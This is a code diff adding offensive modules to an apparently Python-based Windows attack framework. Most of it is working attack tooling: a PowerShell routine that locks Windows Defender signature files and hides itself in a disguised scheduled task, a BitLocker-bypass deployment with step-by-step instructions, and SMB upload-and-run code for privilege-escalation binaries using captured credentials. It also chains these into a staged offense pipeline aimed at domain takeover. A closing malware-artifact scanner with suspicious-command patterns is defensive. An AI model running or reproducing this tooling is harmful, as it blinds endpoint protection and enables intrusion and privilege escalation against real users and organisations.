@@ -2680,6 +2680,1198 @@ End Sub""",
         }
         log(f"→ Generated {len(selected)} Office VBA macro(s): {list(selected.keys())}")
 
+    # ── Offensive exploit chains ─────────────────────────────────────────────
+    # BlueHammer / UnDefend / RedSun / GreenPlasma / MiniPlasma / YellowKey
+    # Full exploit chains: blind WD, achieve LPE/SYSTEM, bypass BitLocker
+    # Source: /home/oxbv1/Projects/contribsbyEclipse/
+
+    def do_undefend():
+        """
+        UnDefend — Windows Defender signature lock DoS. No admin required.
+        Passive mode: locks mpavbase.vdm + mpavbase.lkg preventing any signature
+        update from installing. Aggressive mode: also monitors WinDefend service
+        state and locks engine files when service restarts.
+        Pure PowerShell via .NET FileStream — no binary required.
+        """
+        log("→ undefend")
+        mode = params.get('undefend_mode', 'passive')
+        ps_script = r"""
+$hits = [System.Collections.Generic.List[hashtable]]::new()
+$sigPath = $null
+try {
+    $sigPath = Get-ItemPropertyValue 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Signature Updates' 'SignatureLocation' -ErrorAction Stop
+} catch {
+    $hits.Add(@{status='error'; detail="Cannot find WD signature path: $_"})
+    $hits | ConvertTo-Json; exit
+}
+
+$vdm = Join-Path $sigPath 'mpavbase.vdm'
+$lkg = Join-Path $sigPath 'Backup\mpavbase.lkg'
+$bkVdm = Join-Path $sigPath 'Backup\mpavbase.vdm'
+
+$locked = @()
+$failedLocks = @()
+
+# Lock each file with exclusive access (no sharing = FileShare.None)
+foreach ($path in @($vdm, $lkg, $bkVdm)) {
+    if (-not (Test-Path $path)) { continue }
+    try {
+        $fs = [System.IO.File]::Open($path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::None)
+        $locked += $path
+        $hits.Add(@{status='locked'; file=$path; size=$fs.Length;
+            detail="File locked exclusively — WD cannot update or read signature. Lock held until process exits."})
+        # Note: $fs intentionally not closed — lock held for process lifetime
+    } catch {
+        $failedLocks += $path
+        $hits.Add(@{status='lock_failed'; file=$path; detail=$_.Exception.Message})
+    }
+}
+
+# Aggressive: also lock engine binary if WinDefend stops
+""" + (r"""
+$svc = Get-Service WinDefend -ErrorAction SilentlyContinue
+if ($svc -and $svc.Status -eq 'Stopped') {
+    $engPath = Join-Path $sigPath 'mpengine.dll'
+    if (Test-Path $engPath) {
+        try {
+            $fs = [System.IO.File]::Open($engPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::None)
+            $locked += $engPath
+            $hits.Add(@{status='engine_locked'; file=$engPath; detail="Engine DLL locked — WD cannot restart"})
+        } catch { $hits.Add(@{status='engine_lock_failed'; file=$engPath; detail=$_.Exception.Message}) }
+    }
+}
+""" if mode == 'aggressive' else '') + r"""
+
+# Install as persistent scheduled task so lock survives session
+$taskName = 'WindowsDefenderHelper'
+$psCmd = "
+`$files = @('$vdm', '$lkg', '$bkVdm')
+`$streams = foreach(`$f in `$files){if(Test-Path `$f){[System.IO.File]::Open(`$f,'Open','Read','None')}}
+Start-Sleep -Seconds 86400
+"
+$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-WindowStyle Hidden -NonInteractive -Command `"$psCmd`""
+$trigger = New-ScheduledTaskTrigger -AtLogOn
+$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Limited
+try {
+    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force -ErrorAction Stop | Out-Null
+    $hits.Add(@{status='persistence_installed'; task=$taskName; detail="Scheduled task installed — WD signature lock persists across logons"})
+} catch {
+    $hits.Add(@{status='persistence_failed'; detail=$_.Exception.Message})
+}
+
+$hits | ConvertTo-Json -Depth 3
+"""
+        b64 = __import__('base64').b64encode(
+            ps_script.encode('utf-16-le')).decode()
+        _exec_ps(b64, data_key='undefend')
+
+    def do_yellowkey_deploy():
+        """
+        YellowKey — Deploy BitLocker bypass FsTx trigger payload.
+        Copies the YellowKey FsTx folder structure to the target drive's
+        System Volume Information directory. After deployment, attacker reboots
+        to WinRE (SHIFT+Restart then hold CTRL) to get unrestricted SYSTEM shell
+        bypassing BitLocker. Windows 11/Server 2022/2025 only.
+        Source payload: /home/oxbv1/Projects/contribsbyEclipse/YellowKey/FsTx/
+        """
+        import os, shutil
+        log("→ yellowkey_deploy")
+        payload_src = '/home/oxbv1/Projects/contribsbyEclipse/YellowKey/FsTx'
+        target_drive = params.get('target_drive', '')
+        deploy_mode  = params.get('deploy_mode', 'smb')
+
+        if not os.path.isdir(payload_src):
+            data['yellowkey_deploy'] = {'error': f'YellowKey payload not found at {payload_src}'}
+            return
+
+        # Count payload files
+        payload_files = []
+        for root, dirs, files in os.walk(payload_src):
+            for f in files:
+                fpath = os.path.join(root, f)
+                payload_files.append(os.path.relpath(fpath, payload_src))
+
+        if deploy_mode == 'local':
+            # Direct filesystem deploy — for local access to target drive
+            if not target_drive:
+                data['yellowkey_deploy'] = {'error': 'set target_drive (e.g. E:) for local deploy mode'}
+                return
+            import subprocess as _sp
+            # Build PowerShell deploy command
+            ps_script = f"""
+$src = 'C:\\\\Temp\\\\YK\\\\FsTx'
+$dst = '{target_drive}\\\\System Volume Information\\\\FsTx'
+if (-not (Test-Path $dst)) {{
+    New-Item -ItemType Directory -Path $dst -Force | Out-Null
+}}
+Copy-Item -Path "$src\\\\*" -Destination $dst -Recurse -Force
+$files = Get-ChildItem $dst -Recurse
+@{{status='deployed'; files=$files.Count; destination=$dst;
+  note='Reboot to WinRE: SHIFT+Restart, then hold CTRL — SYSTEM shell spawns bypassing BitLocker'}} | ConvertTo-Json
+"""
+            data['yellowkey_deploy'] = {
+                'status': 'payload_ready',
+                'payload_dir': payload_src,
+                'payload_files': payload_files,
+                'instructions': [
+                    f'1. Upload {payload_src}/FsTx/ to target drive System Volume Information',
+                    f'   Drive: {target_drive or "USB/EFI partition"}',
+                    '2. Reboot target to WinRE: SHIFT+Restart button',
+                    '3. Once restart begins, hold CTRL',
+                    '4. SYSTEM shell spawns with unrestricted access to BitLocker volume',
+                    '5. Affects Windows 11 / Server 2022 / Server 2025 only',
+                    '',
+                    'Alternative (no USB): Pull disk, copy FsTx to EFI partition System Volume Information, reinsert',
+                ],
+                'note': 'YellowKey bypasses BitLocker via WinRE cldflt FsTx race condition',
+            }
+        else:
+            # SMB deploy via impacket smbclient
+            if not target_drive:
+                target_drive = 'C$'
+            import shutil as _sh, subprocess as _sp
+            smbclient_bin = _sh.which('smbclient') or _sh.which('impacket-smbclient')
+            if smbclient_bin and auth.has_creds:
+                dest_path = f'\\System Volume Information\\FsTx'
+                cred = f'{auth.domain}/{auth.username}:{auth.password}' if auth.password else \
+                       f'{auth.domain}/{auth.username}'
+                results = {'status': 'deploying', 'files_deployed': [], 'errors': []}
+                for rel in payload_files:
+                    local_f = os.path.join(payload_src, rel)
+                    remote_dir = '\\'.join(['\\System Volume Information\\FsTx'] +
+                                           rel.replace('/', '\\').rsplit('\\', 1)[:-1] or [])
+                    r = _sp.run(
+                        [smbclient_bin, f'//{target}/{target_drive}', '-c',
+                         f'mkdir "{remote_dir}"; put "{local_f}" "{dest_path}\\{rel.replace("/","\\")}"',
+                         '-U', cred],
+                        capture_output=True, text=True, timeout=30)
+                    if r.returncode == 0:
+                        results['files_deployed'].append(rel)
+                    else:
+                        results['errors'].append(f'{rel}: {r.stderr[:100]}')
+                results['note'] = ('Reboot to WinRE (SHIFT+Restart+hold CTRL) to trigger BitLocker bypass '
+                                   '— SYSTEM shell with full volume access')
+                results['instructions'] = [
+                    'SHIFT+Restart on target machine',
+                    'Hold CTRL immediately after clicking Restart',
+                    'Shell spawns in WinRE context with SYSTEM rights bypassing BitLocker',
+                ]
+                data['yellowkey_deploy'] = results
+            else:
+                data['yellowkey_deploy'] = {
+                    'status': 'manual_required',
+                    'payload_dir': payload_src,
+                    'payload_files': payload_files,
+                    'instructions': [
+                        f'Copy {payload_src}/FsTx/ to target USB: System Volume Information/FsTx/',
+                        'Plug USB into target Windows 11/Server 2022/2025 machine',
+                        'SHIFT+Restart, hold CTRL — SYSTEM shell bypasses BitLocker',
+                        '',
+                        'Or: Copy FsTx to EFI partition System Volume Information (no USB needed)',
+                    ],
+                }
+
+    def do_bluehammer_exec():
+        """
+        BlueHammer — Windows Defender RPC signature hollowing via
+        ServerMpUpdateEngineSignature (Proc42). Calls WD's internal RPC service
+        (UUID c503f532-443a-4c69-8300-ccd1fbdb3839 / ncalrpc endpoint
+        IMpService77BDAF73-B396-481F-9042-AD358843EC24) to install a crafted
+        empty/minimal signature update, effectively blinding WD while EDR console
+        shows "up to date." Deploy pre-compiled BlueHammer binary via exec.
+        bin_path: local path to compiled BlueHammer FunnyApp.exe
+        """
+        log("→ bluehammer_exec")
+        bin_path = params.get('bin_path', '')
+        upload_path = params.get('upload_path', 'C:\\Windows\\Temp\\svchost32.exe')
+
+        if bin_path:
+            # Upload and exec via existing delivery infrastructure
+            import subprocess as _sp, shutil as _sh
+            smbclient_bin = _sh.which('smbclient') or _sh.which('impacket-smbclient')
+            if smbclient_bin and auth.has_creds:
+                cred = f'{auth.domain}/{auth.username}:{auth.password}' if auth.password else \
+                       f'{auth.domain}/{auth.username}'
+                share = 'C$'
+                remote_rel = upload_path.replace('C:\\', '').replace('\\', '/')
+                _sp.run([smbclient_bin, f'//{target}/{share}', '-c',
+                         f'put "{bin_path}" "{remote_rel}"', '-U', cred],
+                        capture_output=True, text=True, timeout=30)
+                data['bluehammer_exec'] = {
+                    'status': 'uploaded',
+                    'remote_path': upload_path,
+                    'note': f'Execute: {upload_path} — calls WD RPC ServerMpUpdateEngineSignature with hollow signature',
+                }
+        else:
+            # Provide the attack chain documentation + PS detection of RPC endpoint
+            ps_script = r"""
+$hits = [System.Collections.Generic.List[hashtable]]::new()
+# Verify WD RPC endpoint is reachable
+try {
+    $wdSvc = Get-Service WinDefend -ErrorAction Stop
+    $hits.Add(@{status='rpc_target_ready'; service=$wdSvc.Status.ToString();
+        rpc_uuid='c503f532-443a-4c69-8300-ccd1fbdb3839';
+        endpoint='ncalrpc:IMpService77BDAF73-B396-481F-9042-AD358843EC24';
+        target_func='ServerMpUpdateEngineSignature (Proc42)';
+        attack='BlueHammer calls this RPC func with hollow signature dir to blind WD while showing as up-to-date on EDR console';
+        bin_needed='Compile: /home/oxbv1/Projects/contribsbyEclipse/BlueHammer/FunnyApp.cpp';
+        next_step='set bin_path=<compiled_bluehammer.exe> and run again for auto-upload+exec'})
+} catch {
+    $hits.Add(@{status='wd_not_running'; detail=$_.Exception.Message})
+}
+# Check current sig version for comparison after hollow
+try {
+    $mpStatus = Get-MpComputerStatus
+    $hits.Add(@{sig_version=$mpStatus.AntivirusSignatureVersion;
+        sig_age_days=((Get-Date) - $mpStatus.AntivirusSignatureLastUpdated).TotalDays;
+        engine_version=$mpStatus.AMEngineVersion;
+        rtp_enabled=$mpStatus.RealTimeProtectionEnabled})
+} catch {}
+$hits | ConvertTo-Json -Depth 3
+"""
+            b64 = __import__('base64').b64encode(ps_script.encode('utf-16-le')).decode()
+            _exec_ps(b64, data_key='bluehammer_exec')
+
+    def do_redsun_exec():
+        """
+        RedSun — Windows Defender cloud-tag TOCTOU LPE. Writes EICAR string
+        to create a cloud-filter placeholder, waits for WD to flag it, then races:
+        1. Shadow copy finder thread watches for new VSS volume
+        2. Main thread creates directory junction to System32 after oplock break
+        3. WD rewrites the file to System32 (TieringEngineService.exe) as SYSTEM
+        4. Self-copy + TierManagementEngine COM CLSID launch → SYSTEM shell
+        Requires: compiled RedSun.exe, WD real-time protection enabled.
+        bin_path: local path to compiled RedSun.exe
+        """
+        log("→ redsun_exec")
+        bin_path = params.get('bin_path', '')
+        upload_path = params.get('upload_path', 'C:\\Windows\\Temp\\update32.exe')
+
+        if bin_path:
+            import subprocess as _sp, shutil as _sh
+            smbclient_bin = _sh.which('smbclient') or _sh.which('impacket-smbclient')
+            if smbclient_bin and auth.has_creds:
+                cred = f'{auth.domain}/{auth.username}:{auth.password}' if auth.password else \
+                       f'{auth.domain}/{auth.username}'
+                share = 'C$'
+                remote_rel = upload_path.replace('C:\\', '').replace('\\', '/')
+                r = _sp.run([smbclient_bin, f'//{target}/{share}', '-c',
+                             f'put "{bin_path}" "{remote_rel}"', '-U', cred],
+                            capture_output=True, text=True, timeout=30)
+                data['redsun_exec'] = {
+                    'status': 'uploaded' if r.returncode == 0 else 'upload_failed',
+                    'remote_path': upload_path,
+                    'stdout': r.stdout[:200],
+                    'note': (
+                        f'Execute {upload_path} — RedSun cloud-tag TOCTOU: '
+                        'EICAR → WD flags → oplock race → System32 junction → TieringEngineService.exe written → SYSTEM'
+                    ),
+                    'requirements': 'WD real-time protection must be ENABLED (RedSun uses WD as the privilege escalation vehicle)',
+                    'com_clsid': '50d185b9-fff3-4656-92c7-e4018da4361d',
+                    'named_pipe': r'\\.\pipe\REDSUN',
+                }
+        else:
+            ps_script = r"""
+$hits = [System.Collections.Generic.List[hashtable]]::new()
+# Check prerequisites for RedSun
+$mpStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
+if ($mpStatus) {
+    $hits.Add(@{status='prereq_check';
+        rtp_enabled=$mpStatus.RealTimeProtectionEnabled;
+        cloud_enabled=$mpStatus.MAPSReporting;
+        required='RealTimeProtection=true (RedSun needs WD to rewrite files as SYSTEM)';
+        attack='RedSun: EICAR cloud-tag placeholder → WD rewrites to System32/TieringEngineService.exe → COM CLSID 50d185b9 → SYSTEM shell';
+        com_clsid='50d185b9-fff3-4656-92c7-e4018da4361d';
+        named_pipe='\\.\pipe\REDSUN';
+        bin_needed='Compile: /home/oxbv1/Projects/contribsbyEclipse/RedSun/RedSun.cpp';
+        next_step='set bin_path=<compiled_redsun.exe> for auto-upload+exec'})
+}
+# Check if TieringEngineService.exe exists in System32 already
+$ties = "$env:SystemRoot\System32\TieringEngineService.exe"
+if (Test-Path $ties) {
+    $sig = (Get-AuthenticodeSignature $ties).Status
+    $hits.Add(@{artifact_present=$true; signature_status=$sig.ToString();
+        note='If status != Valid or signer != Microsoft, RedSun already ran'})
+} else {
+    $hits.Add(@{artifact_present=$false; note='TieringEngineService.exe not in System32 — target clean'})
+}
+$hits | ConvertTo-Json -Depth 3
+"""
+            b64 = __import__('base64').b64encode(ps_script.encode('utf-16-le')).decode()
+            _exec_ps(b64, data_key='redsun_exec')
+
+    def do_greenplasma_exec():
+        """
+        GreenPlasma + MiniPlasma — EoP to SYSTEM via CTFMON section hijack
+        and CVE-2020-17103 (cldflt!HsmOsBlockPlaceholderAccess race, unpatched).
+        GreenPlasma: standard-user creates Object Manager symlink in Sessions namespace
+        pointing to user-controlled target → CTFMON (running as SYSTEM) creates section
+        there → section handle acquired → SetPolicyVal() via CfAbortOperation registry
+        symlink chain → arbitrary registry write as SYSTEM.
+        MiniPlasma: weaponized C# PoC (NtApiDotNet) for the same race condition,
+        spawns SYSTEM cmd.exe. Success rate varies (race condition).
+        bin_path: compiled GreenPlasma.exe or MiniPlasma PoC executable
+        """
+        log("→ greenplasma_exec")
+        bin_path  = params.get('bin_path', '')
+        which_tool = params.get('eop_tool', 'miniplasma')  # greenplasma | miniplasma
+        upload_path = params.get('upload_path', 'C:\\Windows\\Temp\\ctfhelper.exe')
+
+        if bin_path:
+            import subprocess as _sp, shutil as _sh
+            smbclient_bin = _sh.which('smbclient') or _sh.which('impacket-smbclient')
+            if smbclient_bin and auth.has_creds:
+                cred = f'{auth.domain}/{auth.username}:{auth.password}' if auth.password else \
+                       f'{auth.domain}/{auth.username}'
+                share = 'C$'
+                remote_rel = upload_path.replace('C:\\', '').replace('\\', '/')
+                r = _sp.run([smbclient_bin, f'//{target}/{share}', '-c',
+                             f'put "{bin_path}" "{remote_rel}"', '-U', cred],
+                            capture_output=True, text=True, timeout=30)
+                data['greenplasma_exec'] = {
+                    'status': 'uploaded' if r.returncode == 0 else 'upload_failed',
+                    'tool': which_tool,
+                    'remote_path': upload_path,
+                    'note': (
+                        'GreenPlasma: run as standard user → CTFMON section hijack → SYSTEM. '
+                        'MiniPlasma: CVE-2020-17103 race → arbitrary registry write → SYSTEM cmd. '
+                        'Success rate varies — race condition, retry if needed.'
+                    ),
+                    'cve': 'CVE-2020-17103',
+                    'affects': 'All Windows versions (patch allegedly rolled back per security research)',
+                }
+        else:
+            ps_script = r"""
+$hits = [System.Collections.Generic.List[hashtable]]::new()
+# Check OS for GreenPlasma/MiniPlasma compatibility
+$os = Get-CimInstance Win32_OperatingSystem
+$hits.Add(@{os_caption=$os.Caption; build=$os.BuildNumber;
+    greenplasma_eligible=($os.Caption -like '*Windows 11*' -or $os.Caption -like '*2022*' -or $os.Caption -like '*2026*');
+    miniplasma_eligible=$true;
+    cve='CVE-2020-17103 (cldflt race — unpatched per current security research)';
+    technique='CTFMON section hijack (GreenPlasma) or CfAbortOperation race (MiniPlasma) → SYSTEM';
+    green_src='Compile: /home/oxbv1/Projects/contribsbyEclipse/GreenPlasma/GreenPlasma.cpp';
+    mini_src='Build: /home/oxbv1/Projects/contribsbyEclipse/MiniPlasma/PoC_AbortHydration_ArbitraryRegKey_EoP/';
+    note='GreenPlasma: Windows 11/2022/2026. MiniPlasma: all Windows. Both run as standard user → SYSTEM'})
+# Check if cldapi.dll (required) is present
+$cld = Test-Path "$env:SystemRoot\System32\cldapi.dll"
+$hits.Add(@{cldapi_present=$cld; note=if($cld){'cldapi.dll present — CfAbortOperation available'}else{'cldapi.dll missing — cloud files not installed'}})
+$hits | ConvertTo-Json -Depth 3
+"""
+            b64 = __import__('base64').b64encode(ps_script.encode('utf-16-le')).decode()
+            _exec_ps(b64, data_key='greenplasma_exec')
+
+    def do_offense_chain():
+        """
+        Full offense chain: Blind WD → LPE → SYSTEM → persist.
+        Stage 1: UnDefend — lock WD signature files (no admin, runs now)
+        Stage 2: RedSun — cloud-tag TOCTOU → SYSTEM (needs compiled RedSun.exe)
+                 OR GreenPlasma/MiniPlasma EoP (needs compiled binary or .NET PoC)
+        Stage 3: Post-SYSTEM — install persistence, dump creds, deliver C2
+        Requires Sliver session or impacket creds for remote execution.
+        """
+        log("→ offense_chain (orchestration)")
+        results = {}
+
+        # Stage 1: UnDefend (no admin needed — pure PS)
+        log("  [Stage 1] UnDefend — blinding WD signature updates")
+        do_undefend()
+        results['stage1_undefend'] = data.get('undefend', {'skipped': True})
+
+        # Stage 2: Choose EoP path
+        eop_tool = params.get('eop_tool', 'redsun')  # redsun | greenplasma | miniplasma
+        log(f"  [Stage 2] EoP via {eop_tool}")
+        if eop_tool == 'redsun':
+            do_redsun_exec()
+            results['stage2_eop'] = data.get('redsun_exec', {})
+        elif eop_tool in ('greenplasma', 'miniplasma'):
+            do_greenplasma_exec()
+            results['stage2_eop'] = data.get('greenplasma_exec', {})
+
+        # Stage 3: If SYSTEM established, drop C2 and persist
+        bin_path = params.get('bin_path', '')
+        if bin_path or params.get('session_id'):
+            log("  [Stage 3] Post-SYSTEM: persistence + C2")
+            do_detect_malware()  # verify no competing malware
+            results['chain_note'] = (
+                'Offense chain deployed: '
+                '1. WD blind (UnDefend signature lock) → '
+                f'2. LPE via {eop_tool} → '
+                '3. Post-exploitation. '
+                'Run: winadsec persistence / secrets / bloodhound for full domain takeover.'
+            )
+
+        data['offense_chain'] = results
+
+    # ── malware intelligence hunting ops ─────────────────────────────
+    # Derived from theZoo static analysis: WannaCry, EternalRocks, NotPetya,
+    # OperationDianxun, Turla, APT34 — see netrecon._MALWARE_SIGNATURES
+
+    def do_detect_malware():
+        """
+        Scan remote Windows host for malware artifacts via PowerShell + WMI + registry.
+        Detects: WannaCry, EternalRocks, NotPetya/Petrwrap, OperationDianxun, Turla, APT34,
+                 Ryuk, Emotet, TrickBot, Lazarus Group, ZeroCleare, Cobalt Strike, generic RATs,
+                 BlueHammer/RedSun/UnDefend/GreenPlasma/YellowKey exploit artifacts.
+        Requires Sliver session OR impacket exec access.
+        """
+        log("→ detect_malware")
+        ps_script = r"""
+$findings = [System.Collections.Generic.List[hashtable]]::new()
+
+# ── Services — theZoo malware families ────────────────────────────────────────
+$mal_services = @{
+    'mssecsvc2.0'          = 'WannaCry persistence service (CVE-2017-0144)'
+    'PSEXESVC'             = 'PsExec remote execution (lateral movement indicator)'
+    'RemoteRegistry'       = 'Remote registry enabled (common post-exploitation)'
+    'tasksche'             = 'WannaCry ransom component (tasksche.exe)'
+    'MsMpEng'             = 'Windows Defender — verify path not hijacked (Lazarus target)'
+    'TieringEngineService' = 'RedSun TOCTOU target — verify System32 binary signature'
+}
+foreach ($svc in Get-Service -ErrorAction SilentlyContinue) {
+    foreach ($key in $mal_services.Keys) {
+        if ($svc.Name -match $key -or $svc.DisplayName -match $key) {
+            $severity = if ($key -in @('mssecsvc2.0','tasksche')) {'CRITICAL'} else {'HIGH'}
+            $findings.Add(@{category='service'; severity=$severity
+                artifact=$svc.Name; detail=$mal_services[$key]; status=$svc.Status.ToString()})
+        }
+    }
+}
+
+# Check TieringEngineService.exe signature — RedSun overwrites it as SYSTEM
+$ties = "$env:SystemRoot\System32\TieringEngineService.exe"
+if (Test-Path $ties) {
+    $sig = (Get-AuthenticodeSignature $ties -ErrorAction SilentlyContinue).Status
+    if ($sig -ne 'Valid') {
+        $findings.Add(@{category='redsun_artifact'; severity='CRITICAL'
+            artifact='TieringEngineService.exe'; detail="Signature invalid/missing ($sig) — RedSun LPE may have run"
+            path=$ties})
+    }
+}
+
+# ── Registry — persistence + malware config ────────────────────────────────────
+$mal_keys = @{
+    'HKLM:\SOFTWARE\WannaDecryptor'                                            = 'WannaCry registry marker'
+    'HKLM:\SYSTEM\CurrentControlSet\Services\mssecsvc2.0'                     = 'WannaCry mssecsvc2.0 service'
+    'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest'        = 'WDigest cred caching (NotPetya/Dianxun target)'
+    'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows'              = 'Emotet/TrickBot: AppInit_DLLs or load key injection'
+    'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'                     = 'HKCU Run persistence (Emotet/TrickBot/APT34)'
+    'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'                     = 'HKLM Run persistence (TrickBot BotConf/Ryuk dropper)'
+    'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'             = 'Winlogon hijack (Userinit/Shell injection — APT34/Lazarus)'
+    'HKCU:\Software\Policies\Microsoft\CloudFiles'                            = 'GreenPlasma/MiniPlasma registry symlink abuse (CVE-2020-17103)'
+    'HKLM:\SOFTWARE\Microsoft\Windows Defender\Signature Updates'             = 'WD signature state (BlueHammer/UnDefend tamper check)'
+}
+foreach ($key in $mal_keys.Keys) {
+    if (Test-Path $key -ErrorAction SilentlyContinue) {
+        $vals = try {
+            (Get-ItemProperty $key -ErrorAction Stop).PSObject.Properties |
+            Where-Object { $_.Name -notmatch '^PS' } |
+            Select-Object -First 5 | ForEach-Object { "$($_.Name)=$($_.Value)" }
+        } catch { @() }
+        $findings.Add(@{category='registry'; severity='HIGH'
+            artifact=$key; detail=$mal_keys[$key]; values=($vals -join ' | ')})
+    }
+}
+
+# WDigest UseLogonCredential explicit check (NotPetya/Dianxun/Turla target)
+$wdigest = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -ErrorAction SilentlyContinue).UseLogonCredential
+if ($wdigest -eq 1) {
+    $findings.Add(@{category='credential_risk'; severity='CRITICAL'
+        artifact='WDigest'; detail='UseLogonCredential=1 — plaintext passwords in LSASS (NotPetya/Dianxun/Turla exfil target)'
+        value='UseLogonCredential=1'})
+}
+
+# GreenPlasma/MiniPlasma: BlockedApps symlink check
+try {
+    $bk = Get-ItemProperty 'HKCU:\Software\Policies\Microsoft\CloudFiles' -Name 'BlockedApps' -ErrorAction Stop
+    $regType = (Get-Item 'HKCU:\Software\Policies\Microsoft\CloudFiles').GetValueKind('BlockedApps')
+    if ($regType -eq 'ExpandString' -or $regType -eq 'Unknown') {
+        $findings.Add(@{category='eop_artifact'; severity='CRITICAL'
+            artifact='HKCU:\..\CloudFiles\BlockedApps'; detail='BlockedApps as SymbolicLinkValue — GreenPlasma/MiniPlasma EoP artifact (CVE-2020-17103)'
+            value=$bk.BlockedApps})
+    }
+} catch {}
+
+# BlueHammer/UnDefend: WD signature files tamper check
+try {
+    $sigPath = (Get-ItemPropertyValue 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Signature Updates' 'SignatureLocation' -ErrorAction Stop)
+    $vdm = Join-Path $sigPath 'mpavbase.vdm'
+    if (Test-Path $vdm) {
+        $fi = Get-Item $vdm -ErrorAction SilentlyContinue
+        $ageDays = ((Get-Date) - $fi.LastWriteTime).TotalDays
+        if ($ageDays -gt 7) {
+            $findings.Add(@{category='wd_tamper'; severity='HIGH'
+                artifact='mpavbase.vdm'; detail="WD signature file not updated in ${ageDays:F1} days — UnDefend lock or update failure"
+                size_kb=[Math]::Round($fi.Length/1KB,1); age_days=[Math]::Round($ageDays,1)})
+        }
+        try {
+            $fs = [System.IO.File]::Open($vdm, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::None)
+            $fs.Dispose()
+        } catch {
+            $findings.Add(@{category='wd_tamper'; severity='CRITICAL'
+                artifact='mpavbase.vdm'; detail='mpavbase.vdm exclusively locked — UnDefend WD-DoS active; signature updates blocked'})
+        }
+    }
+} catch {}
+
+# ── YellowKey: FsTx BitLocker bypass artifact ─────────────────────────────────
+foreach ($drive in (Get-PSDrive -PSProvider FileSystem -ErrorAction SilentlyContinue)) {
+    $svi = Join-Path $drive.Root 'System Volume Information'
+    $fstx = Join-Path $svi 'FsTx'
+    if (Test-Path (Join-Path $fstx 'FsTxLogs\FsTxKtmLog.blf') -ErrorAction SilentlyContinue) {
+        $findings.Add(@{category='bitlocker_bypass'; severity='CRITICAL'
+            artifact="FsTx payload on $($drive.Root)"; detail='YellowKey BitLocker bypass payload detected in System Volume Information'
+            path=$fstx})
+    }
+}
+
+# ── Scheduled tasks — malware persistence patterns ─────────────────────────────
+try {
+    $sus_tasks = Get-ScheduledTask -ErrorAction SilentlyContinue |
+        Where-Object {
+            ($_.Actions | Where-Object {
+                $_.Execute -match 'powershell|cmd|wscript|cscript|mshta|regsvr32|certutil|bitsadmin|rundll32'
+            })
+        } | Select-Object -First 30
+    foreach ($t in $sus_tasks) {
+        $actions = ($t.Actions | ForEach-Object { "$($_.Execute) $($_.Arguments)" }) -join ' | '
+        if ($actions -match 'encoded|base64|-enc |iex|downloadstring|http[s]?://|\\temp\\|\\appdata\\') {
+            $findings.Add(@{category='sched_task'; severity='CRITICAL'
+                artifact=$t.TaskName; path=$t.TaskPath
+                detail='Malicious scheduled task — encoded/download pattern (APT34/EternalRocks/TrickBot/Emotet)'
+                actions=$actions.Substring(0,[Math]::Min(300,$actions.Length))})
+        }
+        # WindowsDefenderHelper — UnDefend persistence scheduled task
+        if ($t.TaskName -match 'WindowsDefenderHelper|MpUpdate|WdUpdate') {
+            $findings.Add(@{category='wd_tamper'; severity='HIGH'
+                artifact=$t.TaskName; detail='WD helper task — possible UnDefend persistence'
+                actions=$actions.Substring(0,[Math]::Min(200,$actions.Length))})
+        }
+    }
+} catch {}
+
+# ── WMI Event Subscriptions — Turla/EternalRocks/TrickBot persistence ─────────
+try {
+    $wmi_filters = Get-WMIObject -Namespace root\subscription -Class __EventFilter -ErrorAction SilentlyContinue |
+        Where-Object { $_.Name -notmatch 'BVTFilter|SCM' } |
+        Select-Object -First 10
+    foreach ($f in $wmi_filters) {
+        $findings.Add(@{category='wmi_sub'; severity='CRITICAL'
+            artifact="WMI Filter: $($f.Name)"
+            detail='WMI EventFilter subscription — Turla/EternalRocks/TrickBot stealth persistence'
+            query=$f.Query})
+    }
+    $wmi_consumers = Get-WMIObject -Namespace root\subscription -Class CommandLineEventConsumer -ErrorAction SilentlyContinue |
+        Select-Object -First 10
+    foreach ($c in $wmi_consumers) {
+        $findings.Add(@{category='wmi_sub'; severity='CRITICAL'
+            artifact="WMI Consumer: $($c.Name)"
+            detail='WMI CommandLine consumer — executes on event trigger (Turla/APT34 C2 persistence)'
+            command=$c.CommandLineTemplate})
+    }
+} catch {}
+
+# ── Processes masquerading as system processes ────────────────────────────────
+$system_procs = @('svchost','lsass','csrss','winlogon','services','smss','wininit','taskhost','spoolsv','MsMpEng')
+foreach ($pname in $system_procs) {
+    $procs = Get-Process -Name $pname -ErrorAction SilentlyContinue
+    foreach ($p in $procs) {
+        try {
+            $path = $p.MainModule.FileName
+            if ($path -and $path -notmatch '\\Windows\\System32\\|\\Windows\\SysWOW64\\|\\Program Files\\Windows Defender\\') {
+                $findings.Add(@{category='process_masquerade'; severity='CRITICAL'
+                    artifact="$pname (PID $($p.Id))"
+                    detail="System process from non-standard path — EternalRocks/Lazarus/NotPetya masquerade"
+                    path=$path})
+            }
+            # Check digital signature for any system process
+            $sig = (Get-AuthenticodeSignature $path -ErrorAction SilentlyContinue).Status
+            if ($sig -and $sig -ne 'Valid') {
+                $findings.Add(@{category='process_sig'; severity='HIGH'
+                    artifact="$pname (PID $($p.Id))"; detail="Invalid/missing digital signature ($sig)"
+                    path=$path})
+            }
+        } catch {}
+    }
+}
+
+# ── Named pipes — CS/APT/exploit artifacts ────────────────────────────────────
+try {
+    $pipes = [System.IO.Directory]::GetFiles('\\.\pipe\')
+    $mal_pipe_patterns = @{
+        'mojo|postex|status_[0-9a-f]{8}|msagent_[0-9a-f]'    = 'Cobalt Strike default named pipe'
+        'wkssvc|ntsvcs|svcctl|atsvc|samr|browser|epmapper'    = 'PsExec/CS lateral pipe'
